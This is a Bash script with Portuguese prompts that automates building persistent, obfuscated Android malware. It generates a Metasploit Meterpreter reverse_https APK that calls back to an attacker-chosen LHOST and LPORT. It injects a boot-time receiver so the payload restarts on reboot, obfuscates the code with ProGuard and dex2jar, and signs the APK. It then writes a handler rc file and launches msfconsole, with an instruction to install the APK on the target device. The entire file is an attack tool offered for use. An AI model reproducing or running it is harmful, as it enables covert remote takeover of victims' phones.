#!/bin/bash

echo "=== Gerador Automático de Payload Android com Persistência e Ofuscação ==="

# Detecta IP local automaticamente (primeiro IP da lista)
DEFAULT_LHOST=$(hostname -I | awk '{print $1}')
read -p "Informe o LHOST (IP do servidor) [${DEFAULT_LHOST}]: " LHOST
LHOST=${LHOST:-$DEFAULT_LHOST}
while [[ -z "$LHOST" ]]; do
    echo "LHOST não pode ser vazio."
    read -p "Informe o LHOST (IP do servidor) [${DEFAULT_LHOST}]: " LHOST
    LHOST=${LHOST:-$DEFAULT_LHOST}
done

# Sugere porta padrão 4444
DEFAULT_LPORT=4444
read -p "Informe o LPORT (porta do servidor) [${DEFAULT_LPORT}]: " LPORT
LPORT=${LPORT:-$DEFAULT_LPORT}
while ! [[ "$LPORT" =~ ^[0-9]+$ ]]; do
    echo "LPORT deve ser um número válido."
    read -p "Informe o LPORT (porta do servidor) [${DEFAULT_LPORT}]: " LPORT
    LPORT=${LPORT:-$DEFAULT_LPORT}
done

read -p "Informe o nome do pacote Android (ex: com.payload.app): " PACKAGE
while [[ -z "$PACKAGE" ]]; do
    echo "Nome do pacote não pode ser vazio."
    read -p "Informe o nome do pacote Android (ex: com.payload.app): " PACKAGE
done

read -p "Informe o caminho para o keystore (ex: my-release-key.jks): " KEYSTORE
while [[ -z "$KEYSTORE" ]]; do
    echo "Caminho do keystore não pode ser vazio."
    read -p "Informe o caminho para o keystore (ex: my-release-key.jks): " KEYSTORE
done

read -p "Informe o alias da chave no keystore (ex: alias_name): " ALIAS
while [[ -z "$ALIAS" ]]; do
    echo "Alias não pode ser vazio."
    read -p "Informe o alias da chave no keystore (ex: alias_name): " ALIAS
done

PAYLOAD_NAME="app_payload.apk"
WORKDIR="app_payload_src"
OUTPUT_APK="app_payload_obf.apk"
PROGUARD_CONFIG="proguard.cfg"
MSF_RC="handler.rc"

generate_keystore() {
    echo "[*] Verificando keystore..."
    if [ ! -f "$KEYSTORE" ]; then
        echo "[*] Keystore não encontrado. Gerando novo keystore..."
        keytool -genkeypair -alias "$ALIAS" -keyalg RSA -keysize 2048 -validity 10000 -keystore "$KEYSTORE" -storepass changeit -keypass changeit -dname "CN=Payload,O=Pentest,C=BR"
        if [ $? -ne 0 ]; then
            echo "Erro ao gerar keystore."
            exit 1
        fi
        echo "[*] Keystore gerado com sucesso."
    else
        echo "[*] Keystore encontrado."
    fi
}

create_proguard_config() {
    cat > $PROGUARD_CONFIG <<EOF
-dontoptimize
-dontwarn **
-keep class com.metasploit.stage.** { *; }
-keep class $PACKAGE.** { *; }
EOF
}

install_apktool() {
    if ! command -v apktool &> /dev/null; then
        echo "[*] apktool não encontrado. Instalando..."
        sudo apt update && sudo apt install -y apktool
        if [ $? -ne 0 ]; then
            echo "Erro ao instalar apktool. Abortando."
            exit 1
        fi
    else
        echo "[*] apktool encontrado."
    fi
}

install_tools() {
    echo "[*] Verificando ferramentas necessárias para ofuscação..."

    # Verifica ProGuard
    if ! command -v proguard &> /dev/null; then
        echo "[*] ProGuard não encontrado. Instalando via apt..."
        sudo apt update && sudo apt install -y proguard
        if [ $? -ne 0 ]; then
            echo "Erro ao instalar ProGuard. Abortando ofuscação."
            return 1
        fi
    else
        echo "[*] ProGuard encontrado."
    fi

    # Verifica dex2jar (d2j-dex2jar e d2j-jar2dex)
    if ! command -v d2j-dex2jar &> /dev/null || ! command -v d2j-jar2dex &> /dev/null; then
        echo "[*] dex2jar não encontrado. Instalando manualmente..."

        DEX2JAR_DIR="$HOME/dex2jar"
        if [ ! -d "$DEX2JAR_DIR" ]; then
            mkdir -p "$DEX2JAR_DIR"
            echo "[*] Baixando dex2jar..."
            wget -q -O /tmp/dex2jar.zip https://github.com/pxb1988/dex2jar/releases/download/2.0/dex2jar-2.0.zip
            if [ $? -ne 0 ]; then
                echo "Erro ao baixar dex2jar. Abortando ofuscação."
                return 1
            fi
            unzip -q /tmp/dex2jar.zip -d "$DEX2JAR_DIR"
            rm /tmp/dex2jar.zip
        fi

        # Adiciona dex2jar ao PATH temporariamente
        export PATH="$DEX2JAR_DIR:$PATH"
        echo "[*] dex2jar instalado e PATH atualizado temporariamente."
    else
        echo "[*] dex2jar encontrado."
    fi

    return 0
}

echo "[*] Gerando payload com msfvenom..."
msfvenom -p android/meterpreter/reverse_https LHOST=$LHOST LPORT=$LPORT R > $PAYLOAD_NAME
if [ $? -ne 0 ]; then
    echo "Erro ao gerar payload com msfvenom."
    exit 1
fi

echo "[*] Verificando apktool..."
install_apktool

echo "[*] Descompilando APK com apktool..."
apktool d $PAYLOAD_NAME -o $WORKDIR -f
if [ $? -ne 0 ]; then
    echo "Erro ao descompilar APK."
    exit 1
fi

SMALI_PATH=$(echo $PACKAGE | sed 's/\./\//g')
BOOTRECEIVER_PATH="$WORKDIR/smali/$SMALI_PATH"

echo "[*] Criando diretório para BootReceiver: $BOOTRECEIVER_PATH"
mkdir -p $BOOTRECEIVER_PATH

echo "[*] Criando BootReceiver.smali..."
cat > $BOOTRECEIVER_PATH/BootReceiver.smali <<EOF
.class public L$PACKAGE/BootReceiver;
.super Landroid/content/BroadcastReceiver;

.method public constructor <init>()V
    .locals 0
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V
    return-void
.end method

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 2

    const-string v0, "android.intent.action.BOOT_COMPLETED"

    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;
    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0

    if-eqz v0, :cond_end

    new-instance v0, Landroid/content/Intent;
    invoke-direct {v0, p1, Lcom/metasploit/stage/PayloadService;}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p1, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    :cond_end
    return-void
.end method
EOF

echo "[*] Modificando AndroidManifest.xml para adicionar BootReceiver..."
sed -i '/<application/a\
    <receiver android:name=".'"$PACKAGE"'.BootReceiver" android:enabled="true" android:exported="true">\
        <intent-filter>\
            <action android:name="android.intent.action.BOOT_COMPLETED"/>\
        </intent-filter>\
    </receiver>' $WORKDIR/AndroidManifest.xml

echo "[*] Criando arquivo de configuração ProGuard..."
create_proguard_config

echo "[*] Recompilando APK..."
apktool b $WORKDIR -o $OUTPUT_APK
if [ $? -ne 0 ]; then
    echo "Erro ao recompilar APK."
    exit 1
fi

install_tools
if [ $? -ne 0 ]; then
    echo "[!] Falha na instalação das ferramentas. Pulando ofuscação."
else
    echo "[*] Iniciando ofuscação com ProGuard..."

    mkdir -p temp_dex
    unzip -o $OUTPUT_APK classes.dex -d temp_dex
    d2j-dex2jar temp_dex/classes.dex -o temp_dex/classes.jar

    proguard @${PROGUARD_CONFIG} -injars temp_dex/classes.jar -outjars temp_dex/classes_obf.jar

    d2j-jar2dex -o temp_dex/classes_obf.dex temp_dex/classes_obf.jar

    zip -j $OUTPUT_APK temp_dex/classes_obf.dex

    rm -rf temp_dex
fi

echo "[*] Assinando APK..."
generate_keystore
apksigner sign --ks $KEYSTORE --ks-key-alias $ALIAS --ks-pass pass:changeit --key-pass pass:changeit $OUTPUT_APK
if [ $? -ne 0 ]; then
    echo "Erro ao assinar APK."
    exit 1
fi

echo "[*] Payload pronto: $OUTPUT_APK"
echo "Instale e execute o APK no dispositivo alvo."

cat > $MSF_RC <<EOF
use exploit/multi/handler
set payload android/meterpreter/reverse_https
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
exploit -j
EOF

echo "[*] Iniciando handler do Metasploit automaticamente..."
msfconsole -r $MSF_RC
